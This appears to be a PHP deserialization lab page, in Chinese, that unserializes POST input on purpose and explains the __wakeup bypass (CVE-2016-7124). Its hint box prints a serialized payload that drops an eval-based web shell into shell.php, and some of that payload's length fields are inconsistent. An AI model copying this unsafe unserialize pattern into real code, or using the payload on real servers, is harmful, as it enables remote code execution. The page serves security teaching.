<?php
// __wakeup绕过反序列化
class Logger {
    public $logfile = '/tmp/app.log';
    public $content = '';

    public function __destruct() {
        file_put_contents($this->logfile, $this->content . "\n", FILE_APPEND);
    }

    public function __wakeup() {
        // 试图修复属性
        $this->logfile = '/tmp/app.log';
    }
}

$output = null;
if (isset($_POST['data'])) {
    $data = $_POST['data'];
    // 漏洞：反序列化用户输入
    $obj = @unserialize($data);
    if ($obj) {
        $output = "反序列化成功，对象类型: " . get_class($obj);
    } else {
        $output = "反序列化失败";
    }
}
?>

<p>日志系统（__wakeup绕过）</p>
<p>反序列化时__wakeup会重置属性，但可通过属性数量绕过。</p>

<form method="POST">
    <label>序列化数据</label>
    <textarea name="data" rows="4" placeholder="输入序列化字符串"><?= h($_POST['data'] ?? '') ?></textarea>
    <button type="submit" class="btn btn-primary">反序列化</button>
</form>

<?php if ($output): ?>
    <div class="result-box"><?= $output ?></div>
<?php endif; ?>

<div style="margin-top:1rem; padding:1rem; background:var(--bg-secondary); border-radius:var(--radius-sm); font-size:0.8rem;">
    <strong style="color:var(--warning);">__wakeup绕过（CVE-2016-7124）：</strong>
    <br>当序列化字符串中属性数量大于实际属性数量时
    <br>__wakeup()不会被调用
    <br>O:6:"Logger":3:{s:7:"logfile";s:10:"shell.php";s:7:"content";s:31:"&lt;?php eval($_POST['cmd']);?&gt;";}
    <br>将3改为4即可绕过
</div>
